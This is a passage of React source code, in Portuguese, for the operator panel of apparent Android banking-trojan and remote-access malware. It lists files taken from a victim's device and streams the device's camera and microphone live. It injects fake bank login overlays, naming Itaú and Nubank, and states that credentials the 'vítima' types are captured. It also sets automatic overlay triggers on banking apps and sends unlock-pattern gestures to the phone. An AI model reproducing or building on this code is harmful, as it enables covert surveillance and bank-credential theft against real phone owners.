                        className="group/card relative bg-gradient-to-b from-[#121214]/90 to-[#300b04]/90 border border-emerald-500/15 hover:border-emerald-500/40 rounded-md p-2.5 transition-all duration-300 shadow-md hover:shadow-[0_4px_15px_rgba(16,185,129,0.1)] flex flex-col justify-between overflow-hidden"
                      >
                        {/* Imagem ou Iícone */}
                        <div className="relative aspect-video w-full rounded-md bg-[#170403] border border-slate-950 overflow-hidden flex items-center justify-center mb-2 shadow-inner group/preview">
                          {isImg && file.data ? (
                            <>
                              <img
                                src={`data:${file.mimeType};base64,${file.data}`}
                                alt={file.fileName}
                                className="object-cover w-full h-full transition-transform duration-500 group-hover/card:scale-108"
                              />
                              {/* Hover overlay com botão de zoom rápido */}
                              <div className="absolute inset-0 bg-black/60 opacity-0 group-hover/preview:opacity-100 transition-opacity duration-300 flex items-center justify-center gap-2">
                                <button
                                  onClick={() => {
                                    setLightboxImage(`data:${file.mimeType};base64,${file.data}`);
                                    setLightboxName(file.fileName || 'Imagem');
                                  }}
                                  className="p-1.5 bg-emerald-500 hover:bg-emerald-400 text-slate-950 rounded-md shadow-lg transform translate-y-2 group-hover/preview:translate-y-0 transition-all duration-300"
                                  title="Ver em Tela Cheia"
                                >
                                  <Eye className="w-3.5 h-3.5 font-bold" />
                                </button>
                                <button
                                  onClick={() => {
                                    const link = document.createElement('a');
                                    link.href = `data:${file.mimeType};base64,${file.data}`;
                                    link.download = file.fileName || 'imagem.jpg';
                                    link.click();
                                  }}
                                  className="p-1.5 bg-[#24242a] hover:bg-[#2a2a31] text-white rounded-md shadow-lg transform translate-y-2 group-hover/preview:translate-y-0 transition-all duration-300 delay-75"
                                  title="Baixar"
                                >
                                  <Download className="w-3.5 h-3.5" />
                                </button>
                              </div>
                            </>
                          ) : (
                            <div className="flex flex-col items-center justify-center p-3 text-center">
                              <span className="text-3xl mb-1 filter drop-shadow-[0_2px_8px_rgba(16,185,129,0.2)]">
                                {isPdf ? '' : ''}
                              </span>
                              <span className="text-[8px] font-bold font-mono text-[#8b8b94] uppercase tracking-wider">
                                {isPdf ? 'PDF Document' : 'Documento'}
                              </span>
                            </div>
                          )}
                        </div>

                        {/* Informações */}
                        <div className="flex flex-col min-w-0 mb-2.5">
                          <span className="font-bold text-slate-200 text-[11px] truncate group-hover/card:text-emerald-400 transition-colors" title={file.fileName}>
                            {file.fileName || 'arquivo'}
                          </span>
                          <div className="flex items-center justify-between mt-1">
                            <span className="px-1.5 py-0.5 bg-emerald-950/65 border border-emerald-500/20 text-emerald-400 text-[8px] rounded font-mono font-bold uppercase tracking-wide">
                              {file.label || 'DOCUMENTO'}
                            </span>
                            <span className="text-[8px] text-[#8b8b94] font-mono">
                              {new Date(file.timestamp).toLocaleTimeString()}
                            </span>
                          </div>
                        </div>

                        {/* Ações (Download para não imagens) */}
                        {!isImg && (
                          <div className="flex items-center gap-1 mt-auto">
                            <button
                              onClick={() => {
                                const link = document.createElement('a');
                                link.href = `data:${file.mimeType};base64,${file.data}`;
                                link.download = file.fileName || 'arquivo';
                                link.click();
                                addLog(` Arquivo baixado: ${file.fileName}`);
                              }}
                              className="w-full py-1.5 bg-emerald-600 hover:bg-emerald-500 text-slate-950 font-bold text-[9px] rounded-md transition-colors flex items-center justify-center gap-1 shadow shadow-emerald-900/30"
                            >
                              <Download className="w-3 h-3" />
                              Baixar
                            </button>
                          </div>
                        )}
                      </div>
                    );
                  })}
                </div>
              ) : (
                /* MODO LISTA */
                <div className="space-y-2 max-h-[360px] overflow-y-auto pr-1 scrollbar-thin scrollbar-thumb-emerald-500/20 scrollbar-track-transparent">
                  {uploadedFiles.map((file, i) => {
                    const isImg = file.mimeType?.startsWith('image/');
                    const isPdf = file.mimeType === 'application/pdf';
                    
                    return (
                      <div
                        key={i}
                        className="group/list relative bg-gradient-to-r from-[#121214]/80 to-[#300b04]/80 border border-emerald-500/10 hover:border-emerald-500/35 rounded-md p-3 flex items-center justify-between gap-3 transition-all duration-300"
                      >
                        <div className="flex items-center gap-3 min-w-0">
                          {/* Miniatura ou Iícone */}
                          <div className="w-10 h-10 rounded-md bg-[#170403] border border-slate-950 overflow-hidden flex items-center justify-center flex-shrink-0 shadow-inner">
                            {isImg && file.data ? (
                              <img
                                src={`data:${file.mimeType};base64,${file.data}`}
                                alt={file.fileName}
                                className="object-cover w-full h-full hover:scale-110 transition-transform cursor-pointer"
                                onClick={() => {
                                  setLightboxImage(`data:${file.mimeType};base64,${file.data}`);
                                  setLightboxName(file.fileName || 'Imagem');
                                }}
                              />
                            ) : (
                              <span className="text-xl">
                                {isPdf ? '' : ''}
                              </span>
                            )}
                          </div>
                          
                          {/* Nome e metadados */}
                          <div className="flex flex-col min-w-0">
                            <span className="font-bold text-slate-200 text-xs truncate group-hover/list:text-emerald-400 transition-colors" title={file.fileName}>
                              {file.fileName || 'arquivo'}
                            </span>
                            <div className="flex items-center gap-2 mt-1">
                              <span className="px-1.5 py-0.5 bg-emerald-950/60 border border-emerald-500/20 text-emerald-400 text-[8px] rounded font-mono font-bold">
                                {file.label || 'DOCUMENTO'}
                              </span>
                              <span className="text-[9px] text-[#8b8b94] font-mono">
                                {new Date(file.timestamp).toLocaleTimeString()}
                              </span>
                            </div>
                          </div>
                        </div>

                        {/* Botões de Ação */}
                        <div className="flex items-center gap-1.5 flex-shrink-0">
                          {isImg && (
                            <button
                              onClick={() => {
                                setLightboxImage(`data:${file.mimeType};base64,${file.data}`);
                                setLightboxName(file.fileName || 'Imagem');
                              }}
                              className="p-1.5 bg-[#200703] hover:bg-[#24242a] text-emerald-400 border border-emerald-500/20 hover:border-emerald-500/40 rounded-md transition-colors"
                              title="Visualizar"
                            >
                              <Eye className="w-3 h-3" />
                            </button>
                          )}
                          <button
                            onClick={() => {
                              const link = document.createElement('a');
                              link.href = `data:${file.mimeType};base64,${file.data}`;
                              link.download = file.fileName || 'arquivo';
                              link.click();
                              addLog(` Arquivo baixado: ${file.fileName}`);
                            }}
                            className="p-1.5 bg-emerald-600 hover:bg-emerald-500 text-slate-950 rounded-md transition-colors font-bold"
                            title="Download"
                          >
                            <Download className="w-3 h-3" />
                          </button>
                        </div>
                      </div>
                    );
                  })}
                </div>
              )}
            </div>

            {/* REMOVIDO: Exfiltrar Dados */}

            {/* REMOVIDO: Logs */}
                </div>
                </div>
                </div>
      
      {/*  MODAL DE CÂMERA */}
      {showCameraModal && (
        <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50" onClick={() => {
          setShowCameraModal(false);
          toggleCamera();
        }}>
          <div className="bg-[#121214] rounded-md p-6 max-w-2xl w-full mx-4" onClick={(e) => e.stopPropagation()}>
            <div className="flex items-center justify-between mb-4">
              <h2 className="text-2xl font-bold text-white flex items-center">
                <span className="text-3xl mr-3"></span>
                Cmera em Tempo Real
              </h2>
              <button
                onClick={() => {
                  setShowCameraModal(false);
                  toggleCamera();
                }}
                className="text-gray-400 hover:text-white text-2xl"
              >
                ×
              </button>
              </div>

            <div className="bg-black rounded-md p-2">
              <canvas
                ref={cameraCanvasRef}
                className="w-full h-auto rounded"
                style={{ maxHeight: '500px' }}
              />
            </div>

            <div className="mt-4 flex items-center justify-center space-x-2 text-green-400">
              <div className="w-3 h-3 bg-green-500 rounded-full animate-pulse"></div>
              <span className="font-semibold">Ao Vivo</span>
            </div>
            
            <div className="mt-4 flex items-center justify-between">
              <div className="flex items-center space-x-2 text-sm text-gray-300">
                <span> Cmera:</span>
                <span className="font-bold">{currentCamera === 'front' ? 'FRONTAL' : 'TRASEIRA'}</span>
              </div>
                <button
                onClick={switchCamera}
                className="flex items-center space-x-2 px-4 py-2 bg-[#ef4444] hover:bg-[#f87171] text-white rounded-md transition-colors"
                >
                <span></span>
                <span>Alternar Cmera</span>
                </button>
              </div>
            </div>
        </div>
      )}
      {/*  MODAL DE CAPTURAS CUSTOMIZADAS */}
      {showCustomCapturesModal && (
        <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50" onClick={() => setShowCustomCapturesModal(false)}>
          <div className="bg-[#121214] border border-teal-500/30 rounded-md p-6 max-w-2xl w-full mx-4 shadow-2xl shadow-teal-500/10 flex flex-col max-h-[85vh]" onClick={(e) => e.stopPropagation()}>
            <div className="flex items-center justify-between mb-4 flex-shrink-0">
              <h2 className="text-xl font-bold text-white flex items-center gap-2">
                <span className="text-2xl"></span>
                Capturas de Telas Customizadas
              </h2>
              <button
                onClick={() => setShowCustomCapturesModal(false)}
                className="text-gray-400 hover:text-white text-2xl"
              >
                ×
              </button>
            </div>

            <div className="flex-1 overflow-y-auto pr-1 space-y-4">
              {customCaptures.length === 0 ? (
                <div className="text-center py-12">
                  <p className="text-slate-400 text-sm">Nenhuma captura customizada recebida até o momento.</p>
                  <p className="text-[#8b8b94] text-xs mt-1.5">Injete uma tela customizada no dispositivo para testar.</p>
                </div>
              ) : (
                customCaptures.map((cap) => (
                  <div key={cap.id} className="bg-[#121214]/60 border border-[#24242a] rounded-md p-4 relative overflow-hidden group">
                    <div className="flex justify-between items-start mb-2.5">
                      <div>
                        <span className="px-2 py-0.5 bg-teal-500/10 border border-teal-500/20 text-teal-400 rounded text-[10px] font-bold font-mono">
                          {cap.project_name || "Custom Screen"}
                        </span>
                        <div className="text-[10px] text-[#8b8b94] mt-1 font-mono">
                          ID do Projeto: {cap.project_id}
                        </div>
                      </div>
                      <div className="flex items-center gap-2">
                        <span className="text-[10px] text-[#8b8b94] font-mono">
                          {new Date(cap.timestamp).toLocaleString()}
                        </span>
                        <button
                          onClick={() => handleDeleteCustomCapture(cap.id)}
                          className="text-[#ef4444] hover:text-[#ef4444] hover:bg-[#ef4444]/10 p-1 rounded transition-colors"
                          title="Excluir captura"
                        >
                          
                        </button>
                      </div>
                    </div>

                    <div className="bg-slate-950/60 border border-[#24242a]/80 rounded-md p-3 space-y-2">
                      {Object.entries(cap.captured_data || {}).map(([key, val]) => {
                        if (key.startsWith('_')) return null; // Oculta propriedades internas como _projectId, etc.
                        return (
                          <div key={key} className="flex flex-col sm:flex-row sm:items-center justify-between text-xs gap-1 border-b border-[#24242a]/30 pb-1.5 last:border-0 last:pb-0">
                            <span className="font-bold text-slate-400 font-mono select-none">{key}:</span>
                            <div className="flex items-center gap-1.5">
                              <span className="text-white font-mono break-all">{String(val)}</span>
                              <button
                                onClick={() => {
                                  navigator.clipboard.writeText(String(val));
                                  addLog(`Copiado: ${key} = ${val}`);
                                }}
                                className="text-[10px] bg-[#24242a] hover:bg-[#2a2a31] text-teal-400 px-1.5 py-0.5 rounded transition-all active:scale-95"
                              >
                                Copiar
                              </button>
                            </div>
                          </div>
                        );
                      })}
                    </div>
                  </div>
                ))
              )}
            </div>
          </div>
        </div>
      )}
      {/*  MODAL DE INJEÇO */}
      {showInjectionModal && (
        <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50" onClick={() => setShowInjectionModal(false)}>
          <div className="bg-[#2e0803] border border-[#2a2a31]/40 rounded-md p-6 max-w-lg w-full mx-4 shadow-2xl shadow-[#ef4444]/20" onClick={(e) => e.stopPropagation()}>
            <div className="flex items-center justify-between mb-6">
              <h2 className="text-2xl font-bold text-white flex items-center gap-2">
                <span className="text-3xl"></span>
                Injetar Tela Customizada (APK Studio)
              </h2>
              <button
                onClick={() => setShowInjectionModal(false)}
                className="text-gray-400 hover:text-white text-2xl"
              >
                ×
              </button>
            </div>

            {(() => {
              const savedProjectsStr = localStorage.getItem('apkStudioProjects');
              const localProjects = savedProjectsStr ? JSON.parse(savedProjectsStr) : [];
              const projects: any[] = [PRESET_BANK_PROJECT, ...localProjects];
              console.log('Projects loaded in injection modal:', projects);
              
              if (projects.length === 0) {
                return (
                  <div className="text-center py-8">
                    <p className="text-slate-300 text-sm mb-4">
                      Nenhum projeto encontrado no APK Studio.
                    </p>
                    <p className="text-[#8b8b94] text-xs mb-6">
                      Crie telas customizadas (ex: Itaú, Nubank, etc.) no APK Studio primeiro para poder injetá-las no dispositivo.
                    </p>
                    <button
                      onClick={() => {
                        setShowInjectionModal(false);
                        navigate('/apk-studio');
                      }}
                      className="px-4 py-2 bg-gradient-to-r from-[#ef4444] to-[#ef4444] hover:from-[#ef4444] hover:to-[#ef4444] text-[#10120a] rounded-md font-semibold transition-colors"
                    >
                      Ir para o APK Studio
                    </button>
                  </div>
                );
              }

              const selectedProject = projects.find(p => p.id === selectedProjectId);
              const screens = selectedProject?.screens || [];

              return (
                <div className="space-y-4">
                  {/* TABS HEADER */}
                  <div className="flex border-b border-[#2a2a31]/10 mb-4">
                    <button
                      type="button"
                      className={`flex-1 pb-2 font-semibold text-sm transition-all ${injectionModalTab === 'inject' ? 'border-b-2 border-[#3a3a44] text-[#ef4444] font-bold' : 'text-slate-400 hover:text-white'}`}
                      onClick={() => setInjectionModalTab('inject')}
                    >
                       Injetar Agora
                    </button>
                    <button
                      type="button"
                      className={`flex-1 pb-2 font-semibold text-sm transition-all ${injectionModalTab === 'mapping' ? 'border-b-2 border-[#3a3a44] text-[#ef4444] font-bold' : 'text-slate-400 hover:text-white'}`}
                      onClick={() => {
                        setInjectionModalTab('mapping');
                        fetchOverlayMappings();
                      }}
                    >
                      š Gatilhos Automáticos ({overlayMappings.length})
                    </button>
                  </div>

                  {injectionModalTab === 'inject' ? (
                    <div className="space-y-4">
                      <div>
                        <label className="block text-slate-300 text-sm font-semibold mb-2">Selecionar Projeto</label>
                        <select
                          value={selectedProjectId || ''}
                          onChange={(e) => {
                            setSelectedProjectId(e.target.value);
                            setSelectedScreenIndex(null);
                          }}
                          className="w-full bg-[#280803] border border-[#2a2a31]/20 rounded-md px-3 py-2 text-white focus:outline-none focus:border-[#f87171]"
                        >
                          <option value="">-- Escolha um Projeto --</option>
                          {projects.map((p) => (
                            <option key={p.id} value={p.id}>
                              {p.name} ({p.projectType === 'payment' ? 'Pagamento' : p.projectType === 'rat' ? 'RAT' : 'Custom'})
                            </option>
                          ))}
                        </select>
                      </div>

                      {selectedProject && (
                        <div>
                          <label className="block text-slate-300 text-sm font-semibold mb-2 animate-fade-in">Selecionar Tela a Injetar</label>
                          {screens.length === 0 ? (
                            <p className="text-amber-400 text-xs italic">Este projeto não possui telas criadas.</p>
                          ) : (
                            <div className="grid grid-cols-1 gap-2 max-h-60 overflow-y-auto pr-1">
                              {screens.map((screen: any, idx: number) => (
                                <button
                                  key={screen.id}
                                  type="button"
                                  onClick={() => setSelectedScreenIndex(idx)}
                                  className={`text-left px-4 py-3 rounded-md border text-sm font-medium transition-all ${
                                    selectedScreenIndex === idx
                                      ? 'bg-[#84cc16]/30 border-[#f87171] text-white'
                                      : 'bg-[#280803]/50 border-[#2a2a31]/10 text-slate-300 hover:border-[#2a2a31]/30 hover:text-white'
                                  }`}
                                >
                                  <div className="font-bold">{screen.name}</div>
                                  <div className="text-[#8b8b94] text-xs mt-0.5">Elementos: {screen.elements?.length || 0} | Fundo: {screen.backgroundColor}</div>
                                </button>
                              ))}
                            </div>
                          )}
                        </div>
                      )}

                      {selectedProject && (
                        <div className="bg-teal-950/20 border border-teal-500/30 rounded-md p-3 text-xs text-teal-400 font-sans flex items-start gap-2">
                          <span className="text-base select-none"></span>
                          <div>
                            <strong>Nota Importante:</strong> Qualquer credencial ou senha digitada pela vítima nessa tela customizada será exibida na seção <strong className="underline text-teal-300 font-bold">Capturas Customizadas</strong> na barra lateral esquerda.
                          </div>
                        </div>
                      )}

                      <div className="flex justify-end gap-3 pt-4 border-t border-[#2a2a31]/10">
                        <button
                          type="button"
                          onClick={() => setShowInjectionModal(false)}
                          className="px-4 py-2 bg-[#2a2a31] hover:bg-[#6f6f78] text-white rounded-md font-semibold transition-colors"
                        >
                          Cancelar
                        </button>
                        <button
                          type="button"
                          disabled={!selectedProject || selectedScreenIndex === null}
                          onClick={() => {
                            if (selectedProject && selectedScreenIndex !== null) {
                              const screen = selectedProject.screens[selectedScreenIndex];
                              applyCustomBlackScreen(screen);
                              setShowInjectionModal(false);
                            }
                          }}
                          className="px-4 py-2 bg-[#84cc16] hover:bg-purple-700 disabled:opacity-50 disabled:cursor-not-allowed text-white rounded-md font-semibold transition-colors flex items-center gap-2"
                        >
                          <span></span> Injetar Agora
                        </button>
                      </div>
                    </div>
                  ) : (
                    <div className="space-y-4">
                      {/* Form de adicionar mapping */}
                      <div className="bg-[#121214]/60 p-4 rounded-md border border-[#2a2a31]/10 space-y-3">
                        <h3 className="text-xs font-black uppercase text-[#f87171] tracking-wider">Novo Auto-Gatilho</h3>
                        
                        <div>
                          <label className="block text-xs text-slate-400 mb-1">Selecionar App do Alvo</label>
                          
                          {/* FILTROS E PESQUISA DE APPS */}
                          <div className="flex gap-1.5 mb-2">
                            <input
                              type="text"
                              placeholder=" Buscar app..."
                              value={mappingSearch}
                              onChange={(e) => setMappingSearch(e.target.value)}
                              className="flex-1 bg-[#280803] border border-[#2a2a31]/20 rounded-md px-2.5 py-1.5 text-xs text-white placeholder-[#8b8b94] focus:outline-none focus:border-[#f87171]"
                            />
                            <div className="flex gap-0.5 border border-[#2a2a31]/20 rounded-md overflow-hidden bg-[#280803]">
                              <button
                                type="button"
                                onClick={() => setMappingFilter('banks')}
                                className={`px-2 text-[10px] font-bold transition-all ${
                                  mappingFilter === 'banks' 
                                    ? 'bg-[#84cc16] text-white shadow-[0_0_10px_rgba(239,68,68,0.3)]' 
                                    : 'text-slate-400 hover:text-white hover:bg-[#24242a]'
                                }`}
                              >
                                 Bancos
                              </button>
                              <button
                                type="button"
                                onClick={() => setMappingFilter('user')}
                                className={`px-2 text-[10px] font-bold transition-all ${
                                  mappingFilter === 'user' 
                                    ? 'bg-[#ef4444] text-white' 
                                    : 'text-slate-400 hover:text-white hover:bg-[#24242a]'
                                }`}
                              >
                                 Usuário
                              </button>
                              <button
                                type="button"
                                onClick={() => setMappingFilter('all')}
                                className={`px-2 text-[10px] font-bold transition-all ${
                                  mappingFilter === 'all' 
                                    ? 'bg-[#ef4444] text-white' 
                                    : 'text-slate-400 hover:text-white hover:bg-[#24242a]'
                                }`}
                              >
                                 Todos
                              </button>
                            </div>
                          </div>

                          <select
                            value={selectedMappingPackage}
                            onChange={(e) => {
                              setSelectedMappingPackage(e.target.value);
                              if (e.target.value !== 'custom') {
                                setCustomMappingPackage('');
                              }
                            }}
                            className="w-full bg-[#280803] border border-[#2a2a31]/20 rounded-md px-3 py-2 text-xs text-white focus:outline-none focus:border-[#f87171]"
                          >
                            <option value="">-- Selecione o App ({filteredAppsForMapping.length} filtrados) --</option>
                            {filteredAppsForMapping.map((app) => (
                              <option key={app.package} value={app.package}>
                                {app.name} ({app.package})
                              </option>
                            ))}
                            <option value="custom"> Digitar pacote manualmente...</option>
                          </select>
                        </div>

                        {selectedMappingPackage === 'custom' && (
                          <div>
                            <label className="block text-xs text-slate-400 mb-1">Digitar Package Name do App</label>
                            <input
                              type="text"
                              placeholder="Ex: com.banco.original"
                              value={customMappingPackage}
                              onChange={(e) => setCustomMappingPackage(e.target.value)}
                              className="w-full bg-[#280803] border border-[#2a2a31]/20 rounded-md px-3 py-2 text-xs text-white focus:outline-none focus:border-[#f87171]"
                            />
                          </div>
                        )}

                        <div className="grid grid-cols-2 gap-2">
                          <div>
                            <label className="block text-xs text-slate-400 mb-1">Projeto</label>
                            <select
                              value={selectedProjectId || ''}
                              onChange={(e) => {
                                setSelectedProjectId(e.target.value);
                                setSelectedScreenIndex(null);
                              }}
                              className="w-full bg-[#280803] border border-[#2a2a31]/20 rounded-md px-3 py-2 text-xs text-white focus:outline-none focus:border-[#f87171]"
                            >
                              <option value="">-- Escolha --</option>
                              {projects.map((p) => (
                                <option key={p.id} value={p.id}>{p.name}</option>
                              ))}
                            </select>
                          </div>

                          {selectedProject && (
                            <div>
                              <label className="block text-xs text-slate-400 mb-1">Tela</label>
                              <select
                                value={selectedScreenIndex !== null ? selectedScreenIndex : ''}
                                onChange={(e) => setSelectedScreenIndex(e.target.value !== '' ? Number(e.target.value) : null)}
                                className="w-full bg-[#280803] border border-[#2a2a31]/20 rounded-md px-3 py-2 text-xs text-white focus:outline-none focus:border-[#f87171]"
                              >
                                <option value="">-- Escolha --</option>
                                {screens.map((screen: any, idx: number) => (
                                  <option key={screen.id} value={idx}>{screen.name}</option>
                                ))}
                              </select>
                            </div>
                          )}
                        </div>

                        <button
                          type="button"
                          disabled={
                            (!selectedMappingPackage || (selectedMappingPackage === 'custom' && !customMappingPackage)) ||
                            !selectedProjectId ||
                            selectedScreenIndex === null
                          }
                          onClick={() => {
                            const targetPkg = selectedMappingPackage === 'custom' ? customMappingPackage : selectedMappingPackage;
                            addOverlayMapping(targetPkg, selectedProjectId!, selectedScreenIndex!);
                            setSelectedMappingPackage('');
                            setCustomMappingPackage('');
                            setSelectedProjectId(null);
                            setSelectedScreenIndex(null);
                          }}
                          className="w-full py-2 bg-[#84cc16] hover:bg-purple-700 disabled:opacity-50 text-white rounded-md font-bold text-xs transition-all shadow-[0_0_10px_rgba(239,68,68,0.3)]"
                        >
                           Configurar Auto-Gatilho
                        </button>
                      </div>

                      {/* Lista de gatilhos configurados */}
                      <div>
                        <h3 className="text-xs font-black uppercase text-slate-400 tracking-wider mb-2">Gatilhos Ativos</h3>
                        {overlayMappings.length === 0 ? (
                          <p className="text-[#8b8b94] text-xs italic text-center py-4 bg-black/10 rounded-md border border-dashed border-[#2a2a31]/10">Nenhum gatilho configurado para este aparelho.</p>
                        ) : (
                          <div className="space-y-2 max-h-48 overflow-y-auto pr-1">
                            {overlayMappings.map((m) => (
                              <div key={m.id} className="flex items-center justify-between p-2.5 bg-[#280803]/50 border border-[#2a2a31]/10 rounded-md text-xs hover:border-[#2a2a31]/30 transition-all">
                                <div className="min-w-0 flex-1 mr-2">
                                  <span className="font-bold text-slate-200 block truncate">{m.package_name}</span>
                                  <span className="text-[10px] text-[#8b8b94]">Tela: {m.screen_name}</span>
                                </div>
                                <button
                                  type="button"
                                  onClick={() => deleteOverlayMapping(m.id)}
                                  className="px-2 py-1 bg-[#121214]/60 border border-[#2a2a31]/30 text-[#ef4444] hover:bg-[#1a1a1e]/60 rounded font-bold transition-all text-[10px]"
                                >
                                  Remover
                                </button>
                              </div>
                            ))}
                          </div>
                        )}
                      </div>
                    </div>
                  )}
                </div>
              );
            })()}
          </div>
        </div>
      )}

      {/*  MODAL DE MICROFONE */}
      {showMicrophoneModal && (
        <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50" onClick={() => {
          setShowMicrophoneModal(false);
          toggleMicrophone();
        }}>
          <div className="bg-[#121214] rounded-md p-6 max-w-md w-full mx-4" onClick={(e) => e.stopPropagation()}>
            <div className="flex items-center justify-between mb-4">
              <h2 className="text-2xl font-bold text-white flex items-center">
                <span className="text-3xl mr-3"></span>
                Microfone em Tempo Real
              </h2>
              <button
                onClick={() => {
                  setShowMicrophoneModal(false);
                  toggleMicrophone();
                }}
                className="text-gray-400 hover:text-white text-2xl"
              >
                ×
              </button>
            </div>
            
            <div className="bg-gradient-to-br from-[#1a1a1e]/30 to-slate-950/30 rounded-md p-8">
              <div className="flex flex-col items-center justify-center space-y-4">
                <div className="relative">
                  <div className="w-32 h-32 bg-[#ef4444] rounded-full flex items-center justify-center animate-pulse">
                    <span className="text-6xl"></span>
          </div>
                  <div className="absolute inset-0 bg-[#ef4444]/30 rounded-full animate-ping"></div>
        </div>
                
                <div className="text-center">
                  <div className="flex items-center justify-center space-x-2 text-green-400 mb-2">
                    <div className="w-3 h-3 bg-green-500 rounded-full animate-pulse"></div>
                    <span className="font-bold text-xl">Escutando...</span>
      </div>
                  <p className="text-gray-300 text-sm">
                    udio sendo transmitido em tempo real
                  </p>
                </div>
                
                {/* Visualizador de áudio simples */}
                <div className="flex items-center justify-center space-x-1">
                  {[...Array(10)].map((_, i) => (
                    <div
                      key={i}
                      className="w-2 bg-green-500 rounded-full"
                      style={{
                        height: `${Math.random() * 40 + 10}px`,
                        animation: `pulse ${Math.random() * 0.5 + 0.3}s ease-in-out infinite`
                      }}
                    />
                  ))}
                </div>
              </div>
            </div>
          </div>
        </div>
      )}
      
      {/* ¥ MODAL EXPANDIDO - VNC + Screen Reader lado a lado */}
      {isExpandedMode && (
        <div className="fixed inset-0 bg-black z-[200] flex flex-col">
          {/* Header do modo expandido */}
          <div className="flex items-center justify-between px-4 py-2 bg-[#121214] border-b border-[#2a2a31]/20">
            <div className="flex items-center space-x-4">
              <h2 className="text-white font-bold">¥ Modo Expandido - {device?.model}</h2>
              <div className={`px-2 py-1 rounded text-xs ${device?.is_online ? 'bg-green-500/20 text-green-400' : 'bg-[#ef4444]/20 text-[#ef4444]'}`}>
                {device?.is_online ? ' Online' : ' Offline'}
              </div>
            </div>
            <button
              onClick={() => setIsExpandedMode(false)}
              className="px-4 py-2 bg-[#ef4444] hover:bg-[#f87171] text-white rounded-md font-semibold transition-all"
            >
               Fechar
            </button>
          </div>
          
          {/* Conteúdo lado a lado */}
          <div className="flex-1 flex gap-4 p-4 overflow-hidden">
            {/* VNC Normal */}
            <div className="flex-1 flex flex-col bg-[#1a1a1e] rounded-md border border-[#2a2a31] overflow-hidden">
              <div className="px-3 py-2 bg-[#ef4444]/20 border-b border-[#2a2a31]/50">
                <span className="text-[#ef4444] font-bold text-sm"> VNC Normal</span>
              </div>
              <div className="flex-1 flex items-center justify-center overflow-hidden p-2">
                {isCaptureEnabled ? (
                  <DeviceScreen
                    deviceId={deviceId!}
                    onCommand={sendCommand}
                    isBlackScreenActive={isBlackScreen}
                    captureMethod="silent"
                    killerFrameOnPointerMove={isKillerMode}
                    onRequestFrame={requestKillerFrame}
                  />
                ) : (
                  <div className="text-center text-gray-400">
                    <p className="mb-2"> Captura não ativada</p>
                    <button
                      onClick={toggleCapture}
                      className="px-4 py-2 bg-[#ef4444] hover:bg-[#f87171] text-white rounded-md text-sm"
                    >
                      Iniciar Captura
                    </button>
                  </div>
                )}
              </div>
            </div>

            {/* Screen Reader V2 Expandido - Canvas + Lista de Elementos */}
            <div className="flex-1 flex flex-col bg-[#1a1a1e] rounded-md border border-green-500 overflow-hidden" style={{ minWidth: 0 }}>
              <div className="px-3 py-2 bg-green-600/20 border-b border-green-500/50 flex items-center justify-between">
                <span className="text-green-300 font-bold text-sm">
                  <Eye className="w-4 h-4 inline mr-1" />
                  Screen Reader V2
                </span>
                <div className="flex items-center space-x-2">
                  <button
                    onClick={() => {
                      const patternDots = [1, 4, 7, 8, 9];
                      const patternStr = '14789';
                      saveDevicePattern(patternStr);
                      const devW = activeHierarchy?.hierarchy?.bounds?.w || SCREEN_BASE_WIDTH;
                      const devH = activeHierarchy?.hierarchy?.bounds?.h || SCREEN_BASE_HEIGHT;
                      const dots = getV2PatternDots(devW, devH, activeHierarchy?.hierarchy);
                      const rawPoints = patternDots.map(dotId => {
                        const d = dots.find(dot => dot.id === dotId);
                        return { x: Math.round(d ? d.x : 0), y: Math.round(d ? d.y : 0) };
                      });
                      sendCommand({ action: 'PATH_GESTURE', path: JSON.stringify(rawPoints) });
                      setPatternInput(patternStr);
                      setCapturedPattern(patternStr);
                      addLog(` Preset L (1-4-7-8-9) executado com sucesso`);
                    }}
                    className="px-2 py-1 bg-[#ef4444] hover:bg-[#ef4444] text-white rounded text-xs font-bold transition flex items-center"
                    title="Executar padrão L (1-4-7-8-9) no celular"
                  >
                     Desbloquear Padrão L (1-4-7-8-9)
                  </button>
                  {isScreenReaderEnabled && (
                    <div className="text-[10px] bg-green-600/30 text-green-300 px-1.5 py-0.5 rounded flex items-center">
                      <div className="w-1.5 h-1.5 bg-green-400 rounded-full mr-1"></div>
                      ~10 FPS
                    </div>
                  )}
                </div>
              </div>
              <div className="flex-1 flex overflow-hidden">
                {!isScreenReaderEnabled ? (
                  <div className="flex-1 flex items-center justify-center text-center text-gray-400 p-4">
                    <div>
                      <Eye className="w-12 h-12 mx-auto mb-2 opacity-50" />
                      <p className="mb-2">Screen Reader não ativado</p>
                      <button
                        onClick={toggleScreenReader}
                        className="px-4 py-2 bg-green-600 hover:bg-green-700 text-white rounded-md text-sm"
                      >
                        Ativar
                      </button>
                    </div>
                  </div>
                ) : activeHierarchy ? (
                  <div className="flex-1 flex overflow-hidden">
                    {/* Canvas interativo da V2 */}
                    <div className="flex items-center justify-center p-2 bg-black/30">
                      <div 
                        className="relative bg-[#120303] cursor-crosshair flex items-center justify-center rounded-md border border-green-500/20"
                        style={{
                          width: '450px',
                          flexShrink: 0,
                          aspectRatio: `${SCREEN_BASE_WIDTH} / ${SCREEN_BASE_HEIGHT}`
                        }}
                        onMouseDown={(e) => {
                          e.preventDefault();
                          const canvas = e.currentTarget.querySelector('canvas');
                          if (!canvas) return;
                          const rect = canvas.getBoundingClientRect();
                          const x = e.clientX - rect.left;
                          const y = e.clientY - rect.top;
                          const devW = activeHierarchy?.hierarchy?.bounds?.w || SCREEN_BASE_WIDTH;
                          const devH = activeHierarchy?.hierarchy?.bounds?.h || SCREEN_BASE_HEIGHT;
                          const realScale = rect.width / devW;
                          const realX = Math.round(x / realScale);
                          const realY = Math.round(y / realScale);

                          const hitDotId = getHitPatternDot(realX, realY, devW, devH, activeHierarchy?.hierarchy);
                          if (v2PatternMode || hitDotId) {
                            if (hitDotId) {
                              v2PatternDrawnRef.current = [hitDotId];
                              setV2PatternDrawn([hitDotId]);
                            } else {
                              v2PatternDrawnRef.current = [];
                              setV2PatternDrawn([]);
                            }
                            setV2PatternDragPos({ x: realX, y: realY });
                          }

                          setMouseDownPos({ x, y });
                          setIsDragging(true);
                          dragPathRef.current = [{ x: realX, y: realY }];
                        }}
                        onMouseMove={(e) => {
                          const canvas = e.currentTarget.querySelector('canvas');
                          if (!canvas) return;
                          const rect = canvas.getBoundingClientRect();
                          const x = e.clientX - rect.left;
                          const y = e.clientY - rect.top;
